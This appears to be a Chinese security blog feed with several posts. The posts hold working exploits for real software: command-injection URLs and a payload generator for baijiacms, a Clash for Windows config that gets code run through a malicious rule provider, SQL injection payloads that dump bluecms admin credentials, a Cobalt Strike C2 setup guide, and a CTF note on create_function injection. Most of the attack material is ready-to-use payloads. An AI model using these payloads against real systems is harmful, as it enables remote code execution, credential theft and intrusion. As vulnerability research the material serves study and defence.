<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>这个system的功能本来是为了执行压缩图片的。所以要利用该漏洞，需要先登录后台，在附近设置中设置图片压缩比例，否则代码无法运行到此处。</p>
<p><img src="image-20221121010931465.png" alt="image-20221121010931465"></p>
<p>EXP1：<a class="link" href="http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/poc.;echo$%7BIFS%7DcGluZyBwb2MuZXhyNm1xLmNleWUuaW8gLWMgNA==%7Cbase64$%7BIFS%7D-d%7Cbash;&amp;status=1&amp;beid=1">http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/poc.;echo${IFS}cGluZyBwb2MuZXhyNm1xLmNleWUuaW8gLWMgNA==|base64${IFS}-d|bash;&amp;status=1&amp;beid=1<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20221121012250381.png" alt="image-20221121012250381"></p>
<p>EXP2：<a class="link" href="http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/whoami.;echo$%7BIFS%7Dd2hvYW1p%7Cbase64$%7BIFS%7D-d%7Cbash;&amp;status=1&amp;beid=1">http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/whoami.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;&amp;status=1&amp;beid=1<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20221121012638014.png" alt="image-20221121012638014"></p>
<p>其中poc可以使用一下代码生成，随后开启web服务确保可以被访问到即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd = <span class="built_in">input</span>(<span class="string">&quot;cmd&gt;&gt;&gt; &quot;</span>) </span><br><span class="line"></span><br><span class="line">b64cmd = base64.b64encode(cmd.encode()).decode()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&quot;echo <span class="subst">&#123;b64cmd&#125;</span>|base64 -d|bash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload = payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;name&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">payload = <span class="string">f&quot;<span class="subst">&#123;name&#125;</span>.;<span class="subst">&#123;payload&#125;</span>;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file=webpath+payload,mode=<span class="string">&#x27;w&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>在该漏洞中，漏洞点为文件includes/baijiacms/common.inc.php<br>第654行的system()。该函数位于file_save()函数中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">system(<span class="string">&#x27;convert&#x27;</span>.<span class="variable">$quality_command</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$file_full_path</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$file_full_path</span>);</span><br></pre></td></tr></table></figure>

<p><img src="image-20221121021939492.png" alt="image-20221121021939492"></p>
<p>其中，$quality_command无法控制，能够控制的只有$file_full_path。</p>
<p>由于上一步调用file_save()的，是fetch_net_file_upload()函数的return部分</p>
<p><img src="image-20221121022039870.png" alt="image-20221121022039870"></p>
<p>$file_full_path的定义往上翻为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_full_path</span> = WEB_ROOT .<span class="variable">$path</span> . <span class="variable">$extpath</span>. <span class="variable">$filename</span>;</span><br><span class="line"><span class="comment"># 后面三个参数定义分别为</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;/attachment/&#x27;</span>;</span><br><span class="line"><span class="variable">$extpath</span>=<span class="string">&quot;<span class="subst">&#123;$extention&#125;</span>/&quot;</span> . date(<span class="string">&#x27;Y/m/&#x27;</span>);</span><br><span class="line"><span class="variable">$filename</span> = random(<span class="number">15</span>) . <span class="string">&quot;.<span class="subst">&#123;$extention&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在$extpath和$filename中出现的$extention的定义为</span></span><br><span class="line"><span class="variable">$extention</span> = pathinfo(<span class="variable">$url</span>,PATHINFO_EXTENSION );</span><br><span class="line"><span class="comment"># 而$url就是可以用户控制的参数，</span></span><br></pre></td></tr></table></figure>

<p>所以能使用的payload只能存在于url后的文件名后缀中，且payload中由于代码功能的限制不能出现，</p>
<ul>
<li><p>htmlspecialchars()      </p>
<ul>
<li>includes/baijiacms.php line92 :$_GP = irequestsplite($_GP);</li>
<li>&amp; </li>
<li>“ </li>
<li>’ </li>
<li>&lt; </li>
<li>&gt;          </li>
</ul>
</li>
<li><p>后缀   (pathinfo())    </p>
<ul>
<li>includes/baijiacms/common.inc.php  line 617 :$extention = pathinfo($url,PATHINFO_EXTENSION );</li>
<li>.          </li>
</ul>
</li>
<li><p>file_get_contents()</p>
<ul>
<li>includes/baijiacms/common.inc.php     line632  :if (file_put_contents($file_tmp_name, file_get_contents($url)) == false) {</li>
<li>空格     </li>
</ul>
</li>
<li><p>文件名</p>
<ul>
<li>web服务器系统类型，在windows下限制颇多</li>
<li>windows<ul>
<li>\           </li>
<li>/           </li>
<li>:           </li>
<li>*</li>
<li>?          </li>
<li>|          </li>
</ul>
</li>
<li>linux<ul>
<li>/</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h2><p>在该系统中，所有的参数都会经过includes/baijiacms.php进行htmlspecialchars过滤</p>
<p><img src="image-20221121021608604.png" alt="image-20221121021608604"></p>
<p>所以payload中首先排除了 &lt; &gt; “ ‘ &amp;这些符号</p>
<h2 id="pathinfo"><a href="#pathinfo" class="headerlink" title="pathinfo()"></a>pathinfo()</h2><p>pathinfo()会返回文件路径的信息</p>
<p><img src="image-20221121023633375.png" alt="image-20221121023633375"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$extention</span> = pathinfo(<span class="variable">$url</span>,PATHINFO_EXTENSION );</span><br></pre></td></tr></table></figure>

<p>代码中传入了PATHINFO_EXTENSION参数，根据官方介绍，传入该参数，只会返回最后一个扩展名，扩展名以  .   划分。结合后面的分析，所以payload只能存在与扩展名中</p>
<p><img src="image-20221121023748242.png" alt="image-20221121023748242"></p>
<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h2><p>这一步有两个条件，首先file_get_contents()需要可以get到文件，其次文件中需要有内容满足file_put_contents()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_put_contents(<span class="variable">$file_tmp_name</span>, file_get_contents(<span class="variable">$url</span>)) == <span class="literal">false</span>) </span><br></pre></td></tr></table></figure>

<p><img src="image-20221117212518384.png" alt="image-20221117212518384"></p>
<h2 id="settings-‘image-compress-openscale’"><a href="#settings-‘image-compress-openscale’" class="headerlink" title="$settings[‘image_compress_openscale’]"></a>$settings[‘image_compress_openscale’]</h2><p>最后在file_save()中还有一步</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(!empty($settings[&#39;image_compress_openscale&#39;]))</span><br></pre></td></tr></table></figure>

<p><img src="image-20221121024152075.png" alt="image-20221121024152075"></p>
<p>这一步在略读了代码后才知道，它由函数globaPriveteSystemSetting()获的，取自数据库中。</p>
<p><img src="image-20221121024947766.png" alt="image-20221121024947766"></p>
<p>略读代码后才知道，这个需要在后台中开启图片上传压缩才会在数据库中建立数据。以便后续读取。</p>
<p>所以需要在后台的附件设置中开启并设置图片压缩比例（具体数字随意）</p>
<p><img src="image-20221121025117963.png" alt="image-20221121025117963"></p>
<h1 id="具体利用过程解析"><a href="#具体利用过程解析" class="headerlink" title="具体利用过程解析"></a>具体利用过程解析</h1><p>EXP:<a class="link" href="http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/%5Bwhoami.;echo$%7BIFS%7Dd2hvYW1p%7Cbase64$%7BIFS%7D-d%7Cbash;%5D(http://42.193.178.194/whoami.;echo$%7BIFS%7Dd2hvYW1p%7Cbase64$%7BIFS%7D-d%7Cbash;)&amp;status=1&amp;beid=1">http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/[whoami.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;](http://42.193.178.194/whoami.%3Becho%24{IFS}d2hvYW1p|base64%24{IFS}-d|bash%3B)&amp;status=1&amp;beid=1<i class="fas fa-external-link-alt"></i></a></p>
<p>这端url中，主要起作用的是url参数，其他的只是陪跑的（但是也不能删）。url参数原本是远程图片地址。</p>
<p>首先在自己的vps上设置payload，这里我设置的命令为whoami，为了便于区分payload，文件名也取名为whoami。然后使用python开启web服务。</p>
<p><img src="image-20221121025858609.png" alt="image-20221121025858609"></p>
<p>然后登录baijiacms后台，设置一个压缩比例，保存，然后访问</p>
<p><a class="link" href="http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/whoami.;echo$%7BIFS%7Dd2hvYW1p%7Cbase64$%7BIFS%7D-d%7Cbash;&amp;status=1&amp;beid=1">http://192.168.0.64/baijiacmsV4-4.1.4/index.php?mod=site&amp;act=public&amp;do=file&amp;op=fetch&amp;url=http://127.0.0.1/whoami.%3Becho%24%7BIFS%7Dd2hvYW1p%7Cbase64%24%7BIFS%7D-d%7Cbash%3B&amp;status=1&amp;beid=1<i class="fas fa-external-link-alt"></i></a></p>
<p>然后我们来看debug。</p>
<p>代码运行到fetch_net_file_upload函数中，走到$extention = pathinfo($url,PATHINFO_EXTENSION );时，截取到了payload：;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;</p>
<p><img src="image-20221121030454954.png" alt="image-20221121030454954"></p>
<p>随后是mkdir根据时间，后缀，建立文件夹。之后来到if (file_put_contents($file_tmp_name, file_get_contents($url)) == false) 进行判断，这边我为了方便查看file_get_contents和file_put_contents哪个会出问题，多加了两行代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$flag1</span> = file_put_contents(<span class="variable">$file_tmp_name</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="variable">$flag2</span> = file_get_contents(<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>

<p>在这里之后进入file_save() 。传入了关键的变量 </p>
<p>$file_full_path：/www/admin/localhost_80/wwwroot/baijiacmsV4-4.1.4/attachment/;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;/2022/11/G55bRGvfRVr00o3.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;</p>
<p><img src="image-20221121031110033.png" alt="image-20221121031110033"></p>
<p>这边经过几个判断后，最后到达system()，最终传入的命令为。</p>
<p>convert -quality 100 /www/admin/localhost_80/wwwroot/baijiacmsV4-4.1.4/attachment/;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;/2022/11/AFqEQN31zocEeu1.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash; /www/admin/localhost_80/wwwroot/baijiacmsV4-4.1.4/attachment/;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;/2022/11/AFqEQN31zocEeu1.;echo${IFS}d2hvYW1p|base64${IFS}-d|bash;</p>
<p>由于代码中会根据后缀建立文件夹，所以在system中，payload一共会执行四次，也就是为什么在执行whoami这个payload是，会输出4个www。</p>
<p><img src="image-20221121031530346.png" alt="image-20221121031530346"></p>
<h1 id="nothing"><a href="#nothing" class="headerlink" title="nothing"></a>nothing</h1><ol>
<li><p>在写测试的命令时，如果要用到ping dnslog这类命令，由于linux默认是会一直ping下去的。所以最好加一个-c 4限制次数（系统被搞崩了好多次）</p>
</li>
<li><p>php中单引号的字符串和双引号的字符串差距还是挺大的。<a class="link" href="https://www.cnblogs.com/youxin/archive/2012/02/13/2348551.html%E3%80%82%E5%9B%A0%E4%B8%BA%E8%BF%99%E4%B8%AA%E7%89%B9%E6%80%A7%EF%BC%8C%E6%B5%8B%E8%AF%95%E7%9A%84%E6%97%B6%E5%80%99%E8%A2%AB%E5%8D%A1%E4%BA%86%E5%A5%BD%E4%B9%85">https://www.cnblogs.com/youxin/archive/2012/02/13/2348551.html。因为这个特性，测试的时候被卡了好久<i class="fas fa-external-link-alt"></i></a></p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>clash 0.20.12 RCE</title>
    <url>/2023/02/08/clash-0-20-12-RCE-This-is-Y/</url>
    <content><![CDATA[<p>参考：<br><a class="link" href="https://github.com/Fndroid/clash_for_windows_pkg/issues/3891">https://github.com/Fndroid/clash_for_windows_pkg/issues/3891<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://mp.weixin.qq.com/s/RFVkocx1ZE6E71zh5vk-Iw">https://mp.weixin.qq.com/s/RFVkocx1ZE6E71zh5vk-Iw<i class="fas fa-external-link-alt"></i></a></p>
<p>config.yaml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port: 7890</span><br><span class="line">socks-port: 7891</span><br><span class="line">allow-lan: true</span><br><span class="line">mode: Rule</span><br><span class="line">log-level: info</span><br><span class="line">external-controller: :9090</span><br><span class="line">proxies:</span><br><span class="line">  - name: a</span><br><span class="line">    type: socks5</span><br><span class="line">    server: 127.0.0.1</span><br><span class="line">    port: &quot;17938&quot;</span><br><span class="line">    skip-cert-verify: true</span><br><span class="line"></span><br><span class="line">rule-providers:</span><br><span class="line">  p:</span><br><span class="line">    type: http</span><br><span class="line">    behavior: domain</span><br><span class="line">    url: &quot;http:&#x2F;&#x2F;192.168.0.101:8090&#x2F;cfw-settings.yaml&quot;</span><br><span class="line">    path: .&#x2F;cfw-settings.yaml</span><br><span class="line">    interval: 86400</span><br></pre></td></tr></table></figure>
<p>cfw-settings.yaml</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">  - DOMAIN-SUFFIX,acl4.ssr,全球直连</span><br><span class="line">showNewVersionIcon: true</span><br><span class="line">hideAfterStartup: false</span><br><span class="line">randomControllerPort: true</span><br><span class="line">runTimeFormat: &quot;hh : mm : ss&quot;</span><br><span class="line">trayOrders:</span><br><span class="line">  - - icon</span><br><span class="line">  - - status</span><br><span class="line">    - traffic</span><br><span class="line">    - text</span><br><span class="line">hideTrayIcon: false</span><br><span class="line">connShowProcess: true</span><br><span class="line">showTrayProxyDelayIndicator: true</span><br><span class="line">profileParsersText: &gt;-</span><br><span class="line">  parsers:</span><br><span class="line">    - reg: .*</span><br><span class="line">      code: </span><br><span class="line">        module.exports.parse &#x3D; async (raw, &#123; axios, yaml, notify, console &#125;, &#123; name, url, interval, selected &#125;) &#x3D;&gt; &#123;</span><br><span class="line">          require(&quot;child_process&quot;).exec(&quot;cmd &#x2F;c calc.exe&quot;);</span><br><span class="line">          return raw;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure>
<p>填好命令、ip和端口，然后开启web服务</p>
<p><img src="image-20230208231332779.png" alt="image-20230208231332779"></p>
<p>然后复制1.yaml文件的url地址下来，使用clash订阅。如果命令没执行，可以重启一下clash试一下。</p>
<p><img src="image-20230208231326607.png" alt="image-20230208231326607"></p>
<p>记得把parse里的内容删掉，不然每次更新的时候都会有这个</p>
<p><img src="image-20230208231750017.png" alt="image-20230208231750017"></p>
]]></content>
  </entry>
  <entry>
    <title>bluecms</title>
    <url>/2021/08/01/bluecms-This-is-Y/</url>
    <content><![CDATA[<h2 id="1-ad-js-php-sql注入漏洞"><a href="#1-ad-js-php-sql注入漏洞" class="headerlink" title="1. ad_js.php sql注入漏洞"></a>1. ad_js.php sql注入漏洞</h2><p><img src="image-20210801150100756.png" alt="image-20210801150100756"><br>get型参数，几乎没有任何过滤。<br>输出显示在网页源码注释中<br><img src="image-20210801150216742.png" alt="image-20210801150216742"><br>payload：<br>    爆表 ?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database() –+%20 –+<br>爆字段这里有点问题，因为在ad_js.php这个文件开始，包含了一个common.php文件，这个文件里，对所有的输入都做了过滤，对每一个输入都用addslashes函数进行了处理<br><img src="image-20210801160048841.png" alt="image-20210801160048841"><br>所以本来的差字段payload应该是<br>    ?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=’blue_cms’<br>可以看到payload里用了引号，找了一圈办法都没法解决，宽字节的话，编码绕不过<br>unhex()只能hex一个字符，char()来拼接的话，+又会被浏览器转成空格，所以最后想了一下，用的这个payload<br>    ?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=mid((select group_concat(table_name) from information_schema.tables where table_SCHEMA=DATABASE()),23,10) –+<br><img src="image-20210801160418957.png" alt="image-20210801160418957"></p>
<p>后续再爆字段应该也是一样的了<br>    ?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin –+</p>
<p>后续更新，直接不要用unhex，直接0x就行了<br>blue_admin用核心编码后，<br><img src="image-20210801161033749.png" alt="image-20210801161033749"></p>
<p>然后payload就是<br>    ?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e</p>
<h2 id="2-comment-php-sql注入漏洞"><a href="#2-comment-php-sql注入漏洞" class="headerlink" title="2. comment.php sql注入漏洞"></a>2. comment.php sql注入漏洞</h2><p>问题的来源在于这个语句的这个函数<br><img src="image-20210801163847721.png" alt="image-20210801163847721"><br><img src="image-20210801163912911.png" alt="image-20210801163912911"></p>
<p>getip()函数再common.fun.php文件中，使用getenv来赋值，comment.php中的功能点是把评论插入到数据库中，插入的时候除了会带上评论内容，评论用户的信息外，还会去试着获取评论用户的IP地址，getip就是完成获取ip这个功能的，从函数内容可以看到，它会尝试去获取x-forwarded-for的内容，这个内容要伪造相对容易，用bp就行了。而获取之后，没有做任何过滤，所以导致了注入，</p>
<p>搞明白了它的原理后，先注册一个用户，发表一篇文章，然后来到文章下面</p>
<p><img src="image-20210801164606976.png" alt="image-20210801164606976"></p>
<p>随便写点东西，抓包，添加一个x-forword-for字段</p>
<p>X-Forwarded-For: 8.8.8.8</p>
<p><img src="image-20210801170447867.png" alt="image-20210801170447867"></p>
<p><img src="image-20210801164942309.png" alt="image-20210801164942309"></p>
<p>之后整个sql语句变成了</p>
<p><img src="image-20210801165025816.png" alt="image-20210801165025816"></p>
<p>这个样子，这样子的话，利用insert插入多条语句的特性，把查询到的数据插入到数据库中，看评论的时候就可以把它带出来了。</p>
<p>sql语句稍微处理一下，长这个样子</p>
<p>INSERT INTO blue_comment (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check)VALUES (“,’1’,’3’,’1’,’6’,’12345’,’1627653165’,’8.8.8.8’,’12’)</p>
<p>所以爆表的paylaod是</p>
<p>X-Forwarded-For: 8.8.8.8’,’12’),(‘314’,’1’,’3’,’1’,’6’,user(),’1627653165’,’1</p>
<p><img src="image-20210801175728839.png" alt="image-20210801175728839"></p>
<p><img src="image-20210801175750396.png" alt="image-20210801175750396"></p>
<p>最后的sql语句</p>
<p>INSERT INTO blue_comment<br>(com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES<br>(‘’, ‘1’, ‘3’, ‘1’, ‘6’, ‘comment’, ‘1627811855’, ‘8.8.8.8’,’12’),<br>(‘314’,’1’,’3’,’1’,’6’,user(),’1627653165’,’1’, ‘1’)</p>
<p><img src="image-20210801175807475.png" alt="image-20210801175807475"></p>
<p>之后可以手动进入数据库看看，</p>
<p><img src="image-20210801175958152.png" alt="image-20210801175958152"></p>
<p>两条数据同时插进去了，这时候把它读出来</p>
<p><img src="image-20210801180103967.png" alt="image-20210801180103967"></p>
<p>然后可以开始爆表</p>
<pre><code>X-Forwarded-For: 8.8.8.8&#39;,&#39;12&#39;),(&#39;&#39;,&#39;1&#39;,&#39;3&#39;,&#39;1&#39;,&#39;6&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;1627653165&#39;,&#39;1
</code></pre>
<p><img src="image-20210801180448019.png" alt="image-20210801180448019"></p>
<p>超过长度了，要获取全部数据的话，用mid切片处理一下就好了。</p>
<p>爆字段</p>
<pre><code>X-Forwarded-For: 8.8.8.8&#39;,&#39;12&#39;),(&#39;&#39;,&#39;1&#39;,&#39;3&#39;,&#39;1&#39;,&#39;6&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&quot;blue_admin&quot;),&#39;1627653165&#39;,&#39;1
</code></pre>
<p><img src="image-20210801180643298.png" alt="image-20210801180643298"></p>
<p>同理</p>
<p>爆数据</p>
<pre><code>X-Forwarded-For: 8.8.8.8&#39;,&#39;12&#39;),(&#39;&#39;,&#39;1&#39;,&#39;3&#39;,&#39;1&#39;,&#39;6&#39;,(select group_concat(admin_name,0x3d,pwd) from blue_admin),&#39;1627653165&#39;,&#39;1
</code></pre>
<p><img src="image-20210801180745294.png" alt="image-20210801180745294"></p>
<h2 id="3-ad-js-php-反射xss"><a href="#3-ad-js-php-反射xss" class="headerlink" title="3. ad_js.php 反射xss"></a>3. ad_js.php 反射xss</h2><p>问题在ad_js.php 引用的 common.inc.php文件的error_reporting(E_ERROR);中<br><img src="image-20210801234829682.png" alt="image-20210801234829682"></p>
<p><img src="image-20210801235333843.png" alt="image-20210801235333843"></p>
<p>还是有问题，不明白，error_reporting(E_ERROR);这么就可以把报错输出了</p>
<h2 id="4-guest-book-php-存在sql注入"><a href="#4-guest-book-php-存在sql注入" class="headerlink" title="4. guest_book.php 存在sql注入"></a>4. guest_book.php 存在sql注入</h2><h2 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h2><p>/index.php    $result2 = $db-&gt;query(“SELECT * FROM “.table(‘article’).” WHERE cid=$row1[cat_id] and is_recommend = 1 and is_check = 1 ORDER BY id DESC LIMIT 7”);<br><img src="image-20210801214545694.png" alt="image-20210801214545694"><br>$result2 = $db-&gt;query(“SELECT * FROM “.table(‘article’).” WHERE cid=$row1[cat_id] and is_recommend = 1 and is_check = 1 ORDER BY id DESC LIMIT 7”);<br>查询 row1[cat_id]，<br>需要可以控制blue_arc_cat中的数据</p>
<p>publish.php文件内容有问题，功能全没法用</p>
]]></content>
  </entry>
  <entry>
    <title>cobalt strike入门学习</title>
    <url>/2020/06/12/cobalt%20strike%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13110385.html">源地址：https://www.cnblogs.com/This-is-Y/p/13110385.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>安装：</strong></p>
<p>我选的服务器是ubuntu，首先安装java</p>
<p>apt-get install openjdk-8-jdk</p>
<p>等待安装</p>
<p>输入java -version测试安装是否安装成功（如下图即已安装成功）</p>
<p><strong><img src="1503868-20200615092500010-1005882218.png" alt loading="lazy"></strong></p>
<p> </p>
<p> </p>
<p> </p>
<p>然后将cs文件上传到服务器上，本机windows，这里用pscp</p>
<p>上传文件格式： pscp+空格+本地文件+空格+用户名@ip地址:远端路径</p>
<p> </p>
<p>（虽然说在服务器上的启动文件是<strong>teamserver</strong>，但是这并不意味着只上传一个teamserver文件就完事了。最妥当的办法是压缩整个cs文件，全部上传到服务器中。</p>
<img src="1503868-20200615092309174-1297037155.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> ）</p>
<p> </p>
<p>要记得设置远端路径，成功后会让你输入服务器密码，然后开始等上传完成</p>
<img src="1503868-20200612201018161-37228193.png" alt loading="lazy">

<p> </p>
<p> 上传完后到服务器中查看，</p>
<p> <img src="1503868-20200612202623428-112161419.png" width="900" loading="lazy"></p>
<p> </p>
<p> 可以看到红色的就是刚刚上传的文件，用apt下载一个unzip ：apt-get isntall unzip</p>
<p>创建一个文件夹放cs :mkdir /opt/cobaltstrike</p>
<p>解压：unzip -d /opt/cobaltstrike/ /opt/CobaltStrike.zip</p>
<p>进入到cobaltstrike文件夹内，给予权限：chmod 777 ./teamserver</p>
<p>找到teamserver文件。teamserver文件在这里</p>
<img src="1503868-20200612205727797-1580322160.png" width="900" loading="lazy">

<p> 在该目录下执行./teamserver IP 密码     //ip为服务器的公网ip，密码为到时候客户端连接到cs时用到的密码</p>
<p>执行后不出错是这个样子：</p>
<img src="1503868-20200612205934813-1129708807.png" width="1000" loading="lazy">

<p> </p>
<p>（如果出现报错</p>
<p> java is not in $PATH<br>is Java installed?<br>而java已经安装好了，输入java -version可以正确输出。那就检查上传的cs文件中，是否有这样一个文件</p>
<img src="1503868-20200615092946200-1474257074.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> Win_Linux shell script.7z</p>
<p>有的话，解压出来替换掉原来的部分文件。（目前猜测是因为win和liunx的java路径不同，导致cs文件找不到java）</p>
<p>）</p>
<p> 然后在本地打开客户端：启动start.bat批处理文件</p>
<img src="1503868-20200612210050899-407652551.png" alt loading="lazy">

<p> </p>
<p>Host就是服务器的ip</p>
<p>端口50050，无需改变</p>
<p>User：随便写</p>
<p>Password：刚才执行./teamserver 命令时设置的密码</p>
<p>如果出现Connection timed out connect  </p>
<p>服务器上输入netstat -aptn检查端口打开情况</p>
<img src="1503868-20200612210342115-1582750316.png" width="900" loading="lazy">

<p> </p>
<p> 像我一开始就是没有打开端口，我用的aliyun服务器，在控制台的安全组中添加访问规则即可</p>
<img src="1503868-20200612210456695-383156844.png" width="900" loading="lazy">

<p> </p>
<p> 如果是出现authentication failure!就检查一下密码有没有写错。</p>
<p>最后连接成功！</p>
<img src="1503868-20200612205303009-465713699.png" width="900" loading="lazy">

<p> </p>
<p> 博客参考于：<a class="link" href="https://www.cnblogs.com/kang77/p/12133087.html">https://www.cnblogs.com/kang77/p/12133087.html<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>code-breaking</title>
    <url>/2021/08/11/code-breaking-This-is-Y/</url>
    <content><![CDATA[<h1 id="2018"><a href="#2018" class="headerlink" title="2018"></a>2018</h1><h2 id="function"><a href="#function" class="headerlink" title="function"></a>function</h2><p>puzzle代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$arg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="variable">$action</span>)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$action</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用正则进行了过滤，action中不能出现小写字母，数字，下划线<br>然后去查资料的时候，知道p牛提到过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code-breaking puzzles第一题，function，为什么函数前面可以加一个%5c?</span><br><span class="line">其实简单的不行，php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。</span><br><span class="line">如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</span><br></pre></td></tr></table></figure>
<p>在前面加一个\就行了，但是老实说，这块主要原理还是不清晰，这样子能过所有正则检测吗，还得找时间测试，学习一下</p>
<p>过了这块后，后面的$action(‘’, $arg);大致就是需要用传递进来的action作为函数明，执行一个可以传递两个参数的函数，然后这里也是学别人的，create_function<br>这个函数的使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create_function(&#39;$a,$b&#39;,&#39;return 111&#39;)</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&gt;</span><br><span class="line"></span><br><span class="line">function a($a, $b)&#123;</span><br><span class="line">    return 111;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样子只是调用create_function创建了一个函数，创建的函数并没有执行，<br>由于第二个参数可控，所以可以注入</p>
